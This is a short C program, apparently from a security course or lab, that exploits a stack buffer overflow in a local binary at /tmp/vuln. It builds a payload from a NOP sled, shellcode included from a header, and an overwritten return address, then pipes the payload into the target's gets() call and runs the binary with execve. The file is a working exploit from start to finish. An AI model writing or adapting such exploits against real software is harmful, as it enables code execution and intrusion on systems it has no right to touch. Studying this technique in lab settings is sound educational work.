#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// We assume vuln is in tmp
#define PROGRAM "/tmp/vuln"
// 1337 + 15 + 8 + 8 + 1 (EOF character)
#define BUFFER_SIZE 1369
#define SHELLCODE_SIZE 23

int main(void)
{

  int fds[2];
  char printf_str[] = ""; 
  char exploit[BUFFER_SIZE];
  char *args[3];
  char *environ[1];

  // Exploit: nop sled (1321) + exploit (24) + return (8) + new line (1) == 1353
  memset(exploit, 0x90, BUFFER_SIZE);
  strncpy(exploit+1321, shellcode, SHELLCODE_SIZE);
  // Return address at 0x7fffffffe820
  strncpy(exploit+1337+15, "\x20\xE8\xFF\xFF\xFF\x7F", 6);
  memset(exploit+1337+15+6, 0x00, 2);
  strncpy(exploit+1337+15+8, "\x20\xE8\xFF\xFF\xFF\x7F", 6);
  memset(exploit+1337+15+8+6, 0x00, 2);
  // Just before, add a new line to break out of gets
  strncpy(exploit+BUFFER_SIZE-1, "\n", 1);


  pipe(fds);
  close(STDIN_FILENO);
  dup2(fds[0], STDIN_FILENO);
  write(fds[1], exploit, BUFFER_SIZE);

  args[0] = PROGRAM;
  args[1] = printf_str;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
